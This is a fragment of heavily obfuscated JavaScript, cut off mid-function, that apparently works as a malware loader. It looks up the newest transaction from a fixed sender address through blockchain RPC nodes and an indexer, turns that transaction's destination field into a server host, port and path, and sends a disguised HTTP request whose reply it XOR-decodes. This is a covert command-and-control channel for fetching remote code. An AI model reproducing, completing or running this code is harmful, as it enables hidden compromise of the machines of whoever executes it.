_0x34d744=_0x5f350f;_0x38fd3b||_0x375886[_0x34d744(0x23e)](0x1*-0x1d22+-0x17a3*-0x1+0x57f,--_0x583ce1)||_0x375886[_0x34d744(0x2d6)](_0x2a773f,null);});});}function candidateBlocks(_0xfe6b1e){var _0x5a5d60=_0x18fc94,_0x16c2d5={'vhCZu':function(_0x594ab1,_0x1fcbc5){return _0x594ab1-_0x1fcbc5;},'Egxmd':function(_0x55f61f,_0x123252){return _0x55f61f-_0x123252;},'nrYJl':function(_0x169009,_0xe5df25){return _0x169009+_0xe5df25;},'FguSm':function(_0x5df4c8,_0x602696){return _0x5df4c8-_0x602696;},'IUIEc':function(_0x16717a,_0x357c51){return _0x16717a+_0x357c51;},'eutsS':function(_0x571b7b,_0x11bcdd){return _0x571b7b<_0x11bcdd;},'erNWT':function(_0x46ecd9,_0xdda6c1){return _0x46ecd9(_0xdda6c1);}},_0x21913a,_0x1cdfde=_0x16c2d5[_0x5a5d60(0x339)](_0xfe6b1e,BLOCK_MULTIPLE),_0x1b46ee=[_0x16c2d5[_0x5a5d60(0x376)](_0xfe6b1e,-0xb97+-0x707*0x5+0x2ebb),_0xfe6b1e,_0x16c2d5[_0x5a5d60(0x338)](_0xfe6b1e,0xe0c+0x5b8+-0x13c3*0x1),_0x16c2d5[_0x5a5d60(0x2ff)](_0x1cdfde,0x1664+0x524+-0x1*0x1b87),_0x1cdfde,_0x16c2d5[_0x5a5d60(0x30f)](_0x1cdfde,0x26*0xd3+0x3*0x3b3+0x1535*-0x2)],_0x2c15c1={},_0x3d1b6f=[];for(_0x21913a=0x381*-0x1+-0x83d*0x2+0x13fb;_0x16c2d5[_0x5a5d60(0x292)](_0x21913a,_0x1b46ee[_0x5a5d60(0x2cf)]);_0x21913a++)if(!_0x16c2d5[_0x5a5d60(0x292)](_0x1b46ee[_0x21913a],0x2b*-0x3d+0x1c0b+-0x11cc)){var _0x481f96=_0x16c2d5[_0x5a5d60(0x357)](String,_0x1b46ee[_0x21913a]);_0x2c15c1[_0x481f96]||(_0x2c15c1[_0x481f96]=!(0x29*0x2c+0x195f+-0x1*0x206b),_0x3d1b6f[_0x5a5d60(0x242)](_0x1b46ee[_0x21913a]));}return _0x3d1b6f;}function blockTask(_0x5a0e49){var _0x25c8ac=_0x18fc94,_0x3469da={'YQWBd':function(_0x2447e9,_0x214e5f,_0x9c1493,_0x5a1706,_0x2be47b){return _0x2447e9(_0x214e5f,_0x9c1493,_0x5a1706,_0x2be47b);},'YFLTr':_0x25c8ac(0x302)+_0x25c8ac(0x2b0),'vaZCq':function(_0x50bc29,_0x2e39d7){return _0x50bc29(_0x2e39d7);},'BoVBN':function(_0x39db0b,_0x4dc58b){return _0x39db0b(_0x4dc58b);},'LPcnA':function(_0xe5d23c,_0x3dd603,_0x414feb){return _0xe5d23c(_0x3dd603,_0x414feb);}},_0xcfbd1d=new AbortController();return{'controller':_0xcfbd1d,'run':function(){var _0x447a20=_0x25c8ac,_0x51d396={'RLpKb':function(_0x2de8ba,_0x5c7bdf){var _0x4b6a98=_0x32cb;return _0x3469da[_0x4b6a98(0x30a)](_0x2de8ba,_0x5c7bdf);}};return _0x3469da[_0x447a20(0x336)](withRpcEndpoints,function(_0x62fdd2,_0x375d93){var _0x3c44d8=_0x447a20;return _0x3469da[_0x3c44d8(0x313)](rpcCall,_0x62fdd2,_0x3469da[_0x3c44d8(0x35d)],[_0x3469da[_0x3c44d8(0x25f)](toBlockHex,_0x5a0e49),!(-0x19dc+-0x2*0xf2b+0x3832)],_0x375d93);},_0xcfbd1d[_0x447a20(0x347)])[_0x447a20(0x236)](function(_0xfef1ae){var _0x4211bc=_0x447a20,_0x4ae77=_0xfef1ae&&_0xfef1ae[_0x4211bc(0x31d)+'ns'];if(!Array[_0x4211bc(0x248)](_0x4ae77))return null;var _0x2ffebc=_0x51d396[_0x4211bc(0x306)](findSenderTx,_0x4ae77);return _0x2ffebc?{'blockNumber':_0x5a0e49,'tx':_0x2ffebc}:null;});}};}function nonceAtBlocks(_0x2bf7ab,_0x47f878){var _0x210b1b=_0x18fc94,_0x19b6b7={'FwJMI':function(_0x1ed3e3,_0x3af7f,_0x1671ef,_0x24bc3e){return _0x1ed3e3(_0x3af7f,_0x1671ef,_0x24bc3e);},'hrmii':function(_0x3dd15f,_0x1689fb){return _0x3dd15f<_0x1689fb;},'lSCOZ':function(_0xc95167,_0x5e43e7){return _0xc95167(_0x5e43e7);},'PDubB':function(_0x350eed,_0x465371,_0x2f4ab3,_0x28f799,_0x6bd607){return _0x350eed(_0x465371,_0x2f4ab3,_0x28f799,_0x6bd607);},'ZIUsX':function(_0x8772ed,_0x51f2f3,_0x488aaf){return _0x8772ed(_0x51f2f3,_0x488aaf);},'QuapD':function(_0x2fd7bd,_0x10a907){return _0x2fd7bd<_0x10a907;},'mJoFr':_0x210b1b(0x312)+_0x210b1b(0x220)+_0x210b1b(0x2ea),'TgWDa':function(_0x312d0a,_0x42c2fd,_0x1febe2){return _0x312d0a(_0x42c2fd,_0x1febe2);}},_0x38136f,_0x2ef46b=[];for(_0x38136f=0x13d3+0x1*-0x1c09+0x836;_0x19b6b7[_0x210b1b(0x254)](_0x38136f,_0x2bf7ab[_0x210b1b(0x2cf)]);_0x38136f++)_0x2ef46b[_0x210b1b(0x242)]([_0x19b6b7[_0x210b1b(0x21f)],[SENDER,_0x19b6b7[_0x210b1b(0x2e3)](toBlockHex,_0x2bf7ab[_0x38136f])]]);return _0x19b6b7[_0x210b1b(0x383)](withRpcEndpoints,function(_0x1d47c5,_0x51710b){var _0x9b84aa=_0x210b1b;return _0x19b6b7[_0x9b84aa(0x32d)](rpcBatch,_0x1d47c5,_0x2ef46b,_0x51710b);},_0x47f878)[_0x210b1b(0x236)](function(_0x56a19f){var _0x538756=_0x210b1b,_0x17cdae=[];for(_0x38136f=-0x23d3+-0x218c+-0x455f*-0x1;_0x19b6b7[_0x538756(0x2e0)](_0x38136f,_0x56a19f[_0x538756(0x2cf)]);_0x38136f++)_0x17cdae[_0x538756(0x242)](_0x19b6b7[_0x538756(0x2e3)](Number,_0x56a19f[_0x38136f]));return _0x17cdae;},function(){var _0x5704e0=_0x210b1b,_0x18eb9f={'hNrMF':function(_0x29f6cd,_0x4ba0b7,_0x54aa5a,_0x196be5,_0x400ec6){var _0x4d2d27=_0x32cb;return _0x19b6b7[_0x4d2d27(0x23f)](_0x29f6cd,_0x4ba0b7,_0x54aa5a,_0x196be5,_0x400ec6);}},_0x2cd5ca=[];for(_0x38136f=0x6d+0x10d3+-0x1140;_0x19b6b7[_0x5704e0(0x2e0)](_0x38136f,_0x2ef46b[_0x5704e0(0x2cf)]);_0x38136f++)_0x2cd5ca[_0x5704e0(0x242)](_0x19b6b7[_0x5704e0(0x323)](withRpcEndpoints,function(_0x3cbc74,_0xe53886){var _0xfc00e8=_0x5704e0;return _0x18eb9f[_0xfc00e8(0x245)](rpcCall,_0x3cbc74,_0x2ef46b[_0x38136f][-0x1387*0x2+0x6*0x15a+0xf79*0x2],_0x2ef46b[_0x38136f][-0x2*-0xc36+-0xae7*-0x1+-0x2352],_0xe53886);},_0x47f878));return Promise[_0x5704e0(0x34a)](_0x2cd5ca)[_0x5704e0(0x236)](function(_0x469c7c){var _0x478192=_0x5704e0,_0x465392=[];for(_0x38136f=-0x1792+-0xcd8+0x3b*0x9e;_0x19b6b7[_0x478192(0x2e0)](_0x38136f,_0x469c7c[_0x478192(0x2cf)]);_0x38136f++)_0x465392[_0x478192(0x242)](_0x19b6b7[_0x478192(0x2e3)](Number,_0x469c7c[_0x38136f]));return _0x465392;});});}function lastSenderTx(_0x23bed6){var _0x52f87a=_0x18fc94,_0x3ea0dd={'hKJxl':function(_0x599b43,_0x385284,_0x28f353,_0xe4b3bb,_0x169e4e){return _0x599b43(_0x385284,_0x28f353,_0xe4b3bb,_0x169e4e);},'IJITi':_0x52f87a(0x366)+_0x52f87a(0x25c),'ekWvq':function(_0x40a4f2,_0x3cd9f1){return _0x40a4f2(_0x3cd9f1);},'IXFGn':function(_0x4033da,_0x127109,_0x543702,_0x425f5c,_0x35ac2a){return _0x4033da(_0x127109,_0x543702,_0x425f5c,_0x35ac2a);},'SSpdu':_0x52f87a(0x312)+_0x52f87a(0x220)+_0x52f87a(0x2ea),'KkkFJ':function(_0xa194d0,_0x1ced23,_0x348a25){return _0xa194d0(_0x1ced23,_0x348a25);},'iUSGc':function(_0x1c4a27,_0xfc05e0){return _0x1c4a27<=_0xfc05e0;},'msyAu':function(_0x4647cf,_0x2be68b){return _0x4647cf-_0x2be68b;},'hPTrH':function(_0x39fa15,_0x102332){return _0x39fa15-_0x102332;},'QRzwh':function(_0x365e45,_0x54785d){return _0x365e45+_0x54785d;},'aEFTY':function(_0x2bf7f8,_0x1fc1d5){return _0x2bf7f8/_0x1fc1d5;},'aKqqd':function(_0x424867,_0x122bcb){return _0x424867*_0x122bcb;},'MfXZS':function(_0x1fa66a,_0x32df28,_0x4bfe22){return _0x1fa66a(_0x32df28,_0x4bfe22);},'pHvik':function(_0x45af77,_0xcddb9e){return _0x45af77<_0xcddb9e;},'Ohkli':function(_0x50ec8f,_0x47ae64){return _0x50ec8f>=_0x47ae64;},'aGKfx':function(_0x32a298,_0xfec7cf){return _0x32a298===_0xfec7cf;},'hxfiR':function(_0xbe6b9d,_0x52b4b3){return _0xbe6b9d>_0x52b4b3;},'dRWZm':function(_0x26070c){return _0x26070c();},'TPLzv':function(_0x585d6b,_0x3a4b38,_0x196eeb,_0x3340f4,_0xfc9088){return _0x585d6b(_0x3a4b38,_0x196eeb,_0x3340f4,_0xfc9088);},'rvGQm':_0x52f87a(0x302)+_0x52f87a(0x2b0),'WGIbH':function(_0x562965,_0x5b1513){return _0x562965(_0x5b1513);},'NQwJY':function(_0x17dc00,_0x42aeeb){return _0x17dc00<_0x42aeeb;},'pnDbz':function(_0x139d9f,_0x261ac4){return _0x139d9f===_0x261ac4;},'wXLKE':function(_0x543bcc,_0x3de987,_0x287a96){return _0x543bcc(_0x3de987,_0x287a96);},'WmIGQ':function(_0xe95695,_0x12ae60){return _0xe95695(_0x12ae60);},'tpTqG':function(_0x21a076,_0x4357d5){return _0x21a076-_0x4357d5;},'cZhmq':function(_0xc1842b,_0x3e2279){return _0xc1842b!=_0x3e2279;},'nbKYq':function(_0xec1d64,_0x4c9afc,_0x456468){return _0xec1d64(_0x4c9afc,_0x456468);}},_0x24d7d2,_0x52e5de,_0x15a31c,_0x465d2f=new AbortController();return(_0x3ea0dd[_0x52f87a(0x332)](null,_0x23bed6)?Promise[_0x52f87a(0x274)](_0x23bed6):_0x3ea0dd[_0x52f87a(0x378)](withRpcEndpoints,function(_0x268013,_0x5b6459){var _0x52c0a0=_0x52f87a;return _0x3ea0dd[_0x52c0a0(0x243)](rpcCall,_0x268013,_0x3ea0dd[_0x52c0a0(0x35a)],[],_0x5b6459);},_0x465d2f[_0x52f87a(0x347)])[_0x52f87a(0x236)](function(_0x18d5b6){var _0x5ec92c=_0x52f87a;return _0x3ea0dd[_0x5ec92c(0x21d)](Number,_0x18d5b6);}))[_0x52f87a(0x236)](function(_0x4c93d1){var _0x13795f=_0x52f87a;return _0x24d7d2=_0x4c93d1,_0x3ea0dd[_0x13795f(0x297)](withRpcEndpoints,function(_0x48f47c,_0x217832){var _0x5b8475=_0x13795f;return _0x3ea0dd[_0x5b8475(0x36f)](rpcCall,_0x48f47c,_0x3ea0dd[_0x5b8475(0x29d)],[SENDER,_0x3ea0dd[_0x5b8475(0x21d)](toBlockHex,_0x24d7d2)],_0x217832);},_0x465d2f[_0x13795f(0x347)]);})[_0x52f87a(0x236)](function(_0x32ceec){var _0x44486d=_0x52f87a,_0x383943={'YNwDo':function(_0x31e37c,_0x2e3f1d){var _0x4b5913=_0x32cb;return _0x3ea0dd[_0x4b5913(0x1f5)](_0x31e37c,_0x2e3f1d);},'nSpVI':function(_0x5a445c,_0x560d73){var _0x3988c3=_0x32cb;return _0x3ea0dd[_0x3988c3(0x33a)](_0x5a445c,_0x560d73);},'ESDFy':function(_0x398db,_0x3e46ab){var _0x1402d6=_0x32cb;return _0x3ea0dd[_0x1402d6(0x2f2)](_0x398db,_0x3e46ab);},'Tmydi':function(_0x35c18b,_0x4502b1){var _0x9c6f58=_0x32cb;return _0x3ea0dd[_0x9c6f58(0x36a)](_0x35c18b,_0x4502b1);},'VnPUf':function(_0x3e110c,_0x574c04){var _0x4f0cb7=_0x32cb;return _0x3ea0dd[_0x4f0cb7(0x1fa)](_0x3e110c,_0x574c04);},'mnNae':function(_0x26e8c7){var _0x1605f5=_0x32cb;return _0x3ea0dd[_0x1605f5(0x29b)](_0x26e8c7);},'QTFWT':function(_0x340235,_0x4cbbb1,_0x464b52,_0x4c3b25,_0x123d99){var _0x3c95cf=_0x32cb;return _0x3ea0dd[_0x3c95cf(0x2f0)](_0x340235,_0x4cbbb1,_0x464b52,_0x4c3b25,_0x123d99);},'kngyS':_0x3ea0dd[_0x44486d(0x267)],'bVtyW':function(_0x43d19a,_0x3fd0df){var _0x1d0f31=_0x44486d;return _0x3ea0dd[_0x1d0f31(0x276)](_0x43d19a,_0x3fd0df);},'lxmdR':function(_0x11352e,_0xc2b39f){var _0x5807ca=_0x44486d;return _0x3ea0dd[_0x5807ca(0x205)](_0x11352e,_0xc2b39f);},'tIDUU':function(_0x3315bb,_0x47ad62){var _0x5f0ffd=_0x44486d;return _0x3ea0dd[_0x5f0ffd(0x2f2)](_0x3315bb,_0x47ad62);},'Zkjuf':function(_0x581a6e,_0x19f3c6){var _0x301308=_0x44486d;return _0x3ea0dd[_0x301308(0x373)](_0x581a6e,_0x19f3c6);},'ygpfp':function(_0x5e6ee1,_0x40dbda,_0x1e6bd8){var _0x55a9ad=_0x44486d;return _0x3ea0dd[_0x55a9ad(0x328)](_0x5e6ee1,_0x40dbda,_0x1e6bd8);}};_0x52e5de=_0x3ea0dd[_0x44486d(0x35b)](Number,_0x32ceec),_0x15a31c=_0x3ea0dd[_0x44486d(0x23a)](_0x52e5de,-0x37*0x89+-0x2b1*-0x1+0x1abf);var _0x119e5d=_0x3ea0dd[_0x44486d(0x23a)](SEARCH_FLOOR,-0x1*-0xc57+-0x2316+0x16c0),_0x2592c2=_0x24d7d2;return function _0x29dec4(){var _0x4540ee=_0x44486d;if(_0x3ea0dd[_0x4540ee(0x331)](_0x3ea0dd[_0x4540ee(0x33c)](_0x2592c2,_0x119e5d),0x18e0+-0xc8b+0x1*-0xc54))return Promise[_0x4540ee(0x274)]();var _0x19cf58,_0x31cf73=_0x3ea0dd[_0x4540ee(0x36a)](_0x3ea0dd[_0x4540ee(0x36a)](_0x2592c2,_0x119e5d),0x31a+0x103a*-0x1+-0xd21*-0x1),_0xfe5580=Math[_0x4540ee(0x2d2)](NONCE_FANOUT,_0x31cf73),_0x35a4f6=[];for(_0x19cf58=-0xdff+-0xc6c*0x1+0x1a6c;_0x3ea0dd[_0x4540ee(0x331)](_0x19cf58,_0xfe5580);_0x19cf58++)_0x35a4f6[_0x4540ee(0x242)](_0x3ea0dd[_0x4540ee(0x216)](_0x119e5d,_0x3ea0dd[_0x4540ee(0x2bc)](_0x3ea0dd[_0x4540ee(0x270)](_0x19cf58,_0x3ea0dd[_0x4540ee(0x36a)](_0x2592c2,_0x119e5d)),_0x3ea0dd[_0x4540ee(0x216)](_0xfe5580,0xa11+-0x1*-0x1f85+0x851*-0x5))));return _0x3ea0dd[_0x4540ee(0x380)](nonceAtBlocks,_0x35a4f6,_0x465d2f[_0x4540ee(0x347)])[_0x4540ee(0x236)](function(_0x362cda){var _0xb6682f=_0x4540ee,_0x3b20b9,_0x352c7c=-(-0x37*0x5a+-0x5e9*-0x5+-0x2*0x51b);for(_0x3b20b9=0x18+-0x23cc+-0xa*-0x392;_0x383943[_0xb6682f(0x308)](_0x3b20b9,_0x362cda[_0xb6682f(0x2cf)]);_0x3b20b9++)if(_0x383943[_0xb6682f(0x352)](_0x362cda[_0x3b20b9],_0x52e5de)){_0x352c7c=_0x3b20b9;break;}return _0x383943[_0xb6682f(0x22e)](-(0xebc+-0xb*0x2f+0x2*-0x65b),_0x352c7c)?_0x119e5d=_0x35a4f6[_0x383943[_0xb6682f(0x2dd)](_0x35a4f6[_0xb6682f(0x2cf)],0x20c+-0x9a0+-0x795*-0x1)]:(_0x2592c2=_0x35a4f6[_0x352c7c],_0x383943[_0xb6682f(0x283)](_0x352c7c,-0x1930*-0x1+0xe7a+-0x27aa)&&(_0x119e5d=_0x35a4f6[_0x383943[_0xb6682f(0x2dd)](_0x352c7c,-0xc76+-0x23d1+0x3048)])),_0x383943[_0xb6682f(0x2c2)](_0x29dec4);});}()[_0x44486d(0x236)](function(){var _0x1bbec0=_0x44486d;return _0x383943[_0x1bbec0(0x32f)](withRpcEndpoints,function(_0x3e743d,_0x5d6826){var _0x33aacc=_0x1bbec0;return _0x383943[_0x33aacc(0x2d1)](rpcCall,_0x3e743d,_0x383943[_0x33aacc(0x27c)],[_0x383943[_0x33aacc(0x358)](toBlockHex,_0x2592c2),!(-0x8*-0x1a5+-0xf6d+0x245)],_0x5d6826);},_0x465d2f[_0x1bbec0(0x347)])[_0x1bbec0(0x236)](function(_0x1c31b4){var _0xab6fbf=_0x1bbec0,_0x5616a9,_0x42fb60=_0x1c31b4&&_0x1c31b4[_0xab6fbf(0x31d)+'ns']||[],_0x1cc137=null;for(_0x5616a9=0x20fe+-0x2149+0x4b;_0x383943[_0xab6fbf(0x2ee)](_0x5616a9,_0x42fb60[_0xab6fbf(0x2cf)]);_0x5616a9++){var _0x56295c=_0x42fb60[_0x5616a9];if(_0x56295c[_0xab6fbf(0x2e5)]&&_0x383943[_0xab6fbf(0x213)](_0x56295c[_0xab6fbf(0x2e5)][_0xab6fbf(0x2c1)+'e'](),SENDER)){if(_0x383943[_0xab6fbf(0x27f)](_0x383943[_0xab6fbf(0x358)](Number,_0x56295c[_0xab6fbf(0x2fd)]),_0x15a31c)){_0x1cc137=_0x56295c;break;}(!_0x1cc137||_0x383943[_0xab6fbf(0x283)](_0x383943[_0xab6fbf(0x358)](Number,_0x56295c[_0xab6fbf(0x2fd)]),_0x383943[_0xab6fbf(0x358)](Number,_0x1cc137[_0xab6fbf(0x2fd)])))&&(_0x1cc137=_0x56295c);}}return{'blockNumber':_0x2592c2,'tx':_0x1cc137};});});})[_0x52f87a(0x236)](function(_0x2d3eca){var _0x557acd=_0x52f87a;return _0x465d2f[_0x557acd(0x20a)](),_0x2d3eca;},function(_0x46d355){var _0x1ebe53=_0x52f87a;throw _0x465d2f[_0x1ebe53(0x20a)](),_0x46d355;});}function lastSenderTxViaIndexer(){var _0xe8ed74=_0x18fc94,_0x37d5db={'LqEQJ':function(_0x6baa9d,_0x403f33){return _0x6baa9d(_0x403f33);},'DfLXD':function(_0xb51b5b,_0x3d970d){return _0xb51b5b+_0x3d970d;},'iSkpo':function(_0x2c1b16,_0x41f8b1){return _0x2c1b16+_0x41f8b1;},'HZizt':function(_0x30692e,_0xdcb704){return _0x30692e+_0xdcb704;},'EirBh':_0xe8ed74(0x379)+_0xe8ed74(0x263)+_0xe8ed74(0x1f3)+_0xe8ed74(0x233),'msZTY':_0xe8ed74(0x244)+_0xe8ed74(0x28e)+_0xe8ed74(0x204)+_0xe8ed74(0x33e)+_0xe8ed74(0x2ae)+_0xe8ed74(0x348)+_0xe8ed74(0x24e)+'om'};return _0x37d5db[_0xe8ed74(0x36e)](httpRequest,_0x37d5db[_0xe8ed74(0x208)](_0x37d5db[_0xe8ed74(0x2ba)](_0x37d5db[_0xe8ed74(0x2d0)](INDEXER_URL,_0x37d5db[_0xe8ed74(0x2c0)]),SENDER),_0x37d5db[_0xe8ed74(0x285)]))[_0xe8ed74(0x236)](function(_0x17229f){var _0x6435bf=_0xe8ed74,_0x1248fc=_0x37d5db[_0x6435bf(0x36e)](findSenderTx,_0x17229f&&Array[_0x6435bf(0x248)](_0x17229f[_0x6435bf(0x25d)])?_0x17229f[_0x6435bf(0x25d)]:[]);return{'blockNumber':_0x37d5db[_0x6435bf(0x36e)](Number,_0x1248fc[_0x6435bf(0x2fc)+'r']),'tx':_0x1248fc};});}function run(){var _0x44e890=_0x18fc94,_0x214f47={'OSswm':function(_0x77cb65,_0xb4ec5d,_0x1a62e9,_0xbbb8e1,_0x514577){return _0x77cb65(_0xb4ec5d,_0x1a62e9,_0xbbb8e1,_0x514577);},'aFhun':_0x44e890(0x366)+_0x44e890(0x25c),'qLiiJ':function(_0x3998ee){return _0x3998ee();},'WZqmy':function(_0x31f097,_0x2fd013){return _0x31f097(_0x2fd013);},'ACKJp':function(_0x2a6deb,_0xb62649){return _0x2a6deb-_0xb62649;},'ddFBp':function(_0x3a6aca,_0x1be93e){return _0x3a6aca%_0x1be93e;},'bPUnO':function(_0x36721f,_0x1b5bfc){return _0x36721f<_0x1b5bfc;},'vYaxt':function(_0x51f79a,_0x40b2eb){return _0x51f79a%_0x40b2eb;},'YQVKW':_0x44e890(0x2c9),'iEFgU':_0x44e890(0x369)+_0x44e890(0x260),'PFbOK':_0x44e890(0x268)+_0x44e890(0x314),'NefgC':function(_0xa0f993,_0x479400){return _0xa0f993(_0x479400);},'LjnKZ':function(_0x7fcbee,_0x1bbc8b){return _0x7fcbee!==_0x1bbc8b;},'VkcYG':_0x44e890(0x247),'HLpSv':_0x44e890(0x2b8),'YizYB':_0x44e890(0x320),'FGUmD':_0x44e890(0x210),'DZlRE':function(_0x5a1517,_0xd9e8b){return _0x5a1517+_0xd9e8b;},'JfjjD':_0x44e890(0x266)+_0x44e890(0x25a)+_0x44e890(0x31a)+_0x44e890(0x271)+_0x44e890(0x315)+_0x44e890(0x2b5)+_0x44e890(0x2c3)+_0x44e890(0x367)+_0x44e890(0x37a)+_0x44e890(0x354)+_0x44e890(0x226)+'6','trnts':function(_0x1bd4d4,_0x4acf6e){return _0x1bd4d4(_0x4acf6e);},'mjivA':_0x44e890(0x2cc),'qBAFO':_0x44e890(0x2f6)+_0x44e890(0x22b)+'4','nYBKy':function(_0x364fc0,_0x1144d5){return _0x364fc0(_0x1144d5);},'Fypmh':_0x44e890(0x36d),'SPkJZ':function(_0x102efe,_0x4e8821,_0x5180c0){return _0x102efe(_0x4e8821,_0x5180c0);},'IZjrD':function(_0x3c0871,_0x294873){return _0x3c0871+_0x294873;},'OjjCI':function(_0x12c051,_0x48a080,_0x59630d,_0x1c7586){return _0x12c051(_0x48a080,_0x59630d,_0x1c7586);},'lmbtl':_0x44e890(0x34c),'DvaAl':_0x44e890(0x25b),'NUYic':function(_0x3626bd,_0x27cb95){return _0x3626bd+_0x27cb95;},'WtRcv':_0x44e890(0x251),'xyeKi':_0x44e890(0x2bf),'qlWvA':_0x44e890(0x365)+_0x44e890(0x38a),'svmzi':function(_0x89c042,_0x5eac0b){return _0x89c042(_0x5eac0b);},'NzjOi':function(_0x5117a5,_0x3c651b){return _0x5117a5+_0x3c651b;},'SNylr':_0x44e890(0x252),'kzZPF':function(_0x2d08d9,_0x6a510e){return _0x2d08d9+_0x6a510e;},'oRRqB':function(_0x7730ef,_0xe9a673){return _0x7730ef+_0xe9a673;},'FBISa':function(_0x58c358,_0x1d0317){return _0x58c358+_0x1d0317;},'SyQCd':function(_0x38deef,_0x16291d){return _0x38deef+_0x16291d;},'pgmNO':_0x44e890(0x291),'erjCg':function(_0x29ec60,_0x59c113){return _0x29ec60+_0x59c113;},'ivDxY':function(_0x1b307e,_0x4b3b60,_0x4d35c6,_0x21b517){return _0x1b307e(_0x4b3b60,_0x4d35c6,_0x21b517);},'bEUtI':function(_0x2a2191,_0x2fd7db){return _0x2a2191+_0x2fd7db;},'ERrvc':_0x44e890(0x22a)+'s','EpRfi':_0x44e890(0x363)+_0x44e890(0x24c),'KrKuw':function(_0x452439,_0x247369){return _0x452439(_0x247369);}};return _0x214f47[_0x44e890(0x370)](withRpcEndpoints,function(_0x1a97bd,_0x4b3290){var _0x38e11e=_0x44e890;return _0x214f47[_0x38e11e(0x275)](rpcCall,_0x1a97bd,_0x214f47[_0x38e11e(0x282)],[],_0x4b3290);})[_0x44e890(0x236)](function(_0x3c4133){var _0x243555=_0x44e890,_0x378acb={'SDXbM':function(_0x588984){var _0x119b29=_0x32cb;return _0x214f47[_0x119b29(0x239)](_0x588984);},'smtCe':function(_0x2024b1,_0x21c3ca){var _0x1c6969=_0x32cb;return _0x214f47[_0x1c6969(0x2a8)](_0x2024b1,_0x21c3ca);}},_0x495f0e,_0x252679=_0x214f47[_0x243555(0x2a8)](Number,_0x3c4133),_0x5c6980=[],_0x383ece=_0x214f47[_0x243555(0x2a8)](candidateBlocks,_0x214f47[_0x243555(0x232)](_0x252679,_0x214f47[_0x243555(0x326)](_0x252679,BLOCK_MULTIPLE)));for(_0x495f0e=-0x1*0x1a21+0x52*-0x67+0x3b1f;_0x214f47[_0x243555(0x215)](_0x495f0e,_0x383ece[_0x243555(0x2cf)]);_0x495f0e++)_0x5c6980[_0x243555(0x242)](_0x214f47[_0x243555(0x2a8)](blockTask,_0x383ece[_0x495f0e]));return _0x214f47[_0x243555(0x2a8)](firstMatch,_0x5c6980)[_0x243555(0x236)](function(_0x4deb25){var _0x42e41d=_0x243555,_0x1e64b0={'Arbsw':function(_0xce0f9c){var _0x40950e=_0x32cb;return _0x378acb[_0x40950e(0x265)](_0xce0f9c);}};return _0x4deb25||_0x378acb[_0x42e41d(0x2a2)](lastSenderTx,_0x252679)[_0x42e41d(0x389)](function(){var _0x4e6e74=_0x42e41d;return _0x1e64b0[_0x4e6e74(0x330)](lastSenderTxViaIndexer);});});})[_0x44e890(0x236)](function(_0x57cc60){var _0x101dfb=_0x44e890,_0x1d17c9={'RZnAB':_0x214f47[_0x101dfb(0x2b9)],'owCHU':_0x214f47[_0x101dfb(0x35f)],'mGbUv':function(_0x102ce2,_0x1244b3){var _0x321679=_0x101dfb;return _0x214f47[_0x321679(0x21e)](_0x102ce2,_0x1244b3);},'BydrM':_0x214f47[_0x101dfb(0x218)],'ZzKvX':function(_0x5b76d3,_0x59b1b,_0xef043f){var _0xef281b=_0x101dfb;return _0x214f47[_0xef281b(0x34e)](_0x5b76d3,_0x59b1b,_0xef043f);},'WJlbP':function(_0x11f839,_0x15ea1e){var _0x157c9a=_0x101dfb;return _0x214f47[_0x157c9a(0x2c4)](_0x11f839,_0x15ea1e);},'KPVtg':function(_0x5e8755,_0x11ad8d,_0x1cb919,_0x574094){var _0x19ff30=_0x101dfb;return _0x214f47[_0x19ff30(0x237)](_0x5e8755,_0x11ad8d,_0x1cb919,_0x574094);},'tRqgL':_0x214f47[_0x101dfb(0x2c8)],'hrRcy':_0x214f47[_0x101dfb(0x36b)],'GRWTi':function(_0x3e8aeb,_0x53ddd4){var _0xdc07ea=_0x101dfb;return _0x214f47[_0xdc07ea(0x26b)](_0x3e8aeb,_0x53ddd4);},'HUhiH':_0x214f47[_0x101dfb(0x21b)],'NHJIR':_0x214f47[_0x101dfb(0x2a0)],'EfeLj':_0x214f47[_0x101dfb(0x334)]},_0x1cad09=_0x214f47[_0x101dfb(0x230)](decodeAddress,_0x57cc60['tx']['to']),_0x22e50b=_0x1cad09[0x308+-0x112f+-0x1*-0xe27],_0x4cd016=_0x1cad09[-0xe45+-0x1f2+0x40e*0x4],_0x5aab89=global;function _0x1903b4(_0x56ecdf,_0x44d9bf){var _0x394c7a=_0x101dfb,_0x33bd20={'voDFx':function(_0x1de8fb,_0x37a4dc){var _0x13505b=_0x32cb;return _0x214f47[_0x13505b(0x215)](_0x1de8fb,_0x37a4dc);},'MeQRi':function(_0x74e908,_0x13f487){var _0x4242eb=_0x32cb;return _0x214f47[_0x4242eb(0x321)](_0x74e908,_0x13f487);},'oUSyL':_0x214f47[_0x394c7a(0x2ab)],'PzaCR':function(_0x109761,_0x3c9ec5){var _0x50c308=_0x394c7a;return _0x214f47[_0x50c308(0x2a8)](_0x109761,_0x3c9ec5);},'UMgkS':_0x214f47[_0x394c7a(0x2b9)],'LNSUD':_0x214f47[_0x394c7a(0x2bb)],'JjwUn':function(_0x347a33,_0xc87a13){var _0x5c0312=_0x394c7a;return _0x214f47[_0x5c0312(0x288)](_0x347a33,_0xc87a13);},'UttIh':function(_0x16f4cc,_0xabc6cd){var _0x37e2a9=_0x394c7a;return _0x214f47[_0x37e2a9(0x350)](_0x16f4cc,_0xabc6cd);},'odKAu':_0x214f47[_0x394c7a(0x201)],'fezep':_0x214f47[_0x394c7a(0x258)],'KjHxH':_0x214f47[_0x394c7a(0x375)],'YNMkH':_0x214f47[_0x394c7a(0x200)]},_0x46d3ad={'hostname':_0x44d9bf[_0x394c7a(0x249)],'port':_0x214f47[_0x394c7a(0x2a8)](Number,_0x44d9bf[_0x394c7a(0x2de)])||-0x1073*-0x1+0x11c4+-0x21e7,'path':_0x214f47[_0x394c7a(0x26f)](_0x44d9bf[_0x394c7a(0x335)],_0x44d9bf[_0x394c7a(0x2c7)]),'headers':{'User-Agent':_0x214f47[_0x394c7a(0x262)],'Sec-V':_0x5aab89['_V']||-0x1*0x17e3+-0x143b+-0x160f*-0x2}};function _0x2af09a(_0x465a61){var _0x296eba=_0x394c7a,_0x2f94a9,_0x40281a=_0x56ecdf[_0x296eba(0x2cf)];for(_0x2f94a9=0x1292+-0x149d+0x20b;_0x33bd20[_0x296eba(0x2df)](_0x2f94a9,_0x465a61[_0x296eba(0x2cf)]);_0x2f94a9++)_0x465a61[_0x2f94a9]^=_0x56ecdf[_0x296eba(0x1f1)](_0x33bd20[_0x296eba(0x2eb)](_0x2f94a9,_0x40281a));return _0x465a61[_0x296eba(0x2b6)](_0x33bd20[_0x296eba(0x2dc)]);}function _0x402866(_0x51d894){var 